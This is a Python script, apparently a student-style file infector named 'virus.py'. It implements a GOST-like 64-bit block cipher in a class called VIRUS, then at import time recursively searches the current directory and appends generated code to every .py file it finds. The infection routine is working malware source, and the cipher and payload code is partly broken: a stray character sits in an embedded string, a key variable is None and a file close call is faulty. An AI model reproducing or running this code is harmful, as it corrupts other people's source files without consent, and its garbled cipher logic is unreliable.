import os, random

cajasS = (
    (4, 10, 9, 2, 13, 8, 0, 14, 6, 11, 1, 12, 7, 15, 5, 3),
    (14, 11, 4, 12, 6, 13, 15, 10, 2, 3, 8, 1, 0, 7, 5, 9),
    (5, 8, 1, 13, 10, 3, 4, 2, 14, 15, 12, 7, 6, 0, 9, 11),
    (7, 13, 10, 1, 0, 8, 9, 15, 14, 4, 6, 12, 11, 2, 5, 3),
    (6, 12, 7, 1, 5, 15, 13, 8, 4, 10, 9, 14, 0, 3, 11, 2),
    (4, 11, 10, 0, 7, 2, 1, 13, 3, 6, 8, 5, 9, 12, 15, 14),
    (13, 11, 4, 1, 3, 15, 5, 9, 0, 10, 14, 7, 6, 8, 2, 12),
    (1, 15, 13, 0, 5, 7, 10, 4, 9, 2, 3, 14, 6, 11, 8, 12),
)

def tam_bit(x):
    assert x >= 0
    return len(bin(x)) - 2

def funcion_f(var, key):
    assert tam_bit(var) <= 32
    assert tam_bit(key) <= 32

    temp = (var + key) % (1 << 32)

    output = 0
    for i in range(8):
        output |= ((cajasS[i][(temp >> (4 * i)) & 0b1111]) << (4 * i))
    output = ((output >> (32 - 11)) | (output << 11)) & 0xFFFFFFFF
    return output


def ronda_cifrado(li, ri, ki):
    out_li = ri
    out_ri = li ^ funcion_f(ri , ki)

    return out_li, out_ri


def ronda_descrifrado(li, ri, ki):
    out_ri = li
    out_li = ri ^ funcion_f(li, ki)

    return out_li, out_ri


class VIRUS:
    def __init__(self):
        self.master_key = [None] * 8

    def set_key(self, master_key):
        assert tam_bit(master_key) <= 256
        for i in range(8):
            self.master_key[i] = (master_key >> (32 * i)) & 0xFFFFFFFF

    def cifrado(self, textoplano):
        assert tam_bit(textoplano) <= 64
        texto_izq = textoplano >> 32
        texto_der = textoplano & 0xFFFFFFFF

        for i in range(24):
            texto_izq, texto_der = ronda_cifrado(
                texto_izq, texto_der, self.master_key[i % 8])

        for i in range(8):
            texto_izq, texto_der = ronda_cifrado(
                texto_izq, texto_der, self.master_key[7 - i])

        return (texto_izq << 32) | texto_der

    def descifrado(self, textocifrado):
        assert tam_bit(textocifrado) <= 64
        texto_izq = textocifrado >> 32
        texto_der = textocifrado & 0xFFFFFFFF

        for i in range(8):
            texto_izq, texto_der = ronda_descrifrado(
                texto_izq, texto_der, self.master_key[i])

        for i in range(24):
            texto_izq, texto_der = ronda_descrifrado(
                texto_izq, texto_der, self.master_key[(7 - i) % 8])

        return (texto_izq << 32) | texto_der
        
def tamano(archivo):
    archivo.seek(0,2) 
    size = archivo.tell()
    return size

with open("virus.py", "rb") as input:
    size = tamano(input)


tam = str(size) 

desc, cif = "", ""
desc +="def descifrado(self, textocifrado):\n"
desc +="    assert tam_bit(textocifrado) <= 64\n"
desc +="    texto_izq = textocifrado >> 32\n"
desc +="    texto_der = textocifrado & 0xFFFFFFFF\n"
desc +="    for i in range(8):\n"
desc +="           texto_izq, texto_der = ronda_descrifrado(\n"
desc +="            texto_izq, texto_der, self.master_key[i])\n"
desc +="    for i in range(24):\n"
desc +="            texto_izq, texto_der = ronda_descrifrado(\n"
desc +="                texto_izq, texto_der, self.master_key[(7 - i) % 8])2\n"
desc +="    return (texto_izq << 32) | texto_der\n\n"

cif+="def cifrado(self, textoplano):\n"
cif+="      assert tam_bit(textoplano) <= 64\n"
cif+="      texto_izq = textoplano >> 32\n"
cif+="      texto_der = textoplano & 0xFFFFFFFF\n"
cif+="      for i in range(24):\n"
cif+="           texto_izq, texto_der = ronda_cifrado(\n"
cif+="               texto_izq, texto_der, self.master_key[i % 8])\n"
cif+="      for i in range(8):\n"
cif+="          texto_izq, texto_der = ronda_cifrado(\n"
cif+="              texto_izq, texto_der, self.master_key[7 - i])\n"
cif+="      return (texto_izq << 32) | texto_der\n\n"


if __name__ == '__main__':
    text = int(tam.ljust(23-len(tam),'0'))
    key = random.getrandbits(256)
    my_GOST = VIRUS()
    my_GOST.set_key(key)

    num = 1000

    llave = my_GOST.set_key(key)

    for i in range(num):
        cifr = my_GOST.cifrado(text)

    programa = str(desc) + str(llave) + str(cifr)

def search(path):
    infectados = []
    archivos = os.listdir(path)
    for nombre in archivos:
        if os.path.isdir(path+"/"+nombre):
            infectados.extend(search(path+"/"+nombre))
        elif nombre[-3:] == ".py":
            infectados.append(path+"/"+nombre)
    return infectados

def infect(infectados):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for nombre in infectados:
        if os.path.basename(nombre) == "virus.py":
            pass
        else:
            f = open(nombre,"a")
            f.write(programa)
            f.close()

infect(search(os.path.abspath("")))

